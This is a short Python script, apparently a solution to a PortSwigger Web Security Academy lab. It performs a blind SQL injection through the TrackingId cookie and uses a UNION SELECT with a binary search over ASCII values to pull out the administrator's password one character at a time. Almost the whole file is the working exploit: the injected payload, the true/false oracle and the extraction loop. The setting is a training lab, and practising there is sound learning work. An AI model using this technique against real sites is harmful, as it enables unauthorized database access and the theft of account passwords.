#!/usr/bin/python
import requests
import sys

# Change BASEURL after generating URL from PortSwigger 
BASEURL = "https://ac741ff71e42c06c809bd76100410069.web-security-academy.net/filter?category=Gifts"

# Send request to get cookies
def SendRequest(url,cookies):
    res =  requests.get(format(url))
    result = []
    for cookie in res.cookies:
       result.append(cookie.value)
    return result

# Fuction to help you check your condition is that true or false 
def evaluateCondition(trackid, session, cond):
    payload = "x'+%s"%(cond)

    response = requests.get(BASEURL, cookies = {'TrackingId': payload, 'session': session})
    if (response.text.find("Welcome back") != -1):
        return True
    return False

# Function to brute force administrator's password
def evaluateSQL(trackid, session):
    result = ""
    while (True):
        range_low = 0
        range_high = 128

        for i in range(0, 8):
            testChar = (range_low + range_high) / 2
            res = evaluateCondition(trackid, session, "UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'AND+ascii(substring((password),%d,1))>=%d--"%(len(result) + 1, testChar))
            if res:
                range_low = testChar
            else:
                range_high = testChar

        if testChar == 0:
            break

        result += chr(testChar)
        print "Found: %s"%(result)
    return result


if __name__ == "__main__":
    # Get cookies
    cookies = []
    cookies = SendRequest(BASEURL, {})
    # 
    if  len(sys.argv) > 1:
        print evaluateCondition(cookies[0], cookies[1], sys.argv[1])
    else:
        evaluateSQL(cookies[0], cookies[1])
